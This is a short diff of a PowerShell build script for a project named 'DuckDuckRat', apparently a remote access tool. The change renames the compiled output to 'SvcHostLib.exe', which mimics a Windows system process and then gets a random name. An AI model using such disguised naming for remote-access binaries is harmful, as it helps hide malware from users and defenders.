@@ -225,7 +225,7 @@ Write-Host "[*] Phase 5: Final Monolithic AOT Build (DuckDuckRat)..." -Foregroun
 dotnet publish DuckDuckRat.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
 if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }
 
-$BuildExe = "bin\Release\net8.0-windows\win-x64\publish\DuckDuckRat.exe"
+$BuildExe = "bin\Release\net8.0-windows\win-x64\publish\SvcHostLib.exe"
 $FinalExe = "bin\Release\net8.0-windows\win-x64\publish\$RandName"
 
 if (Test-Path $BuildExe) {
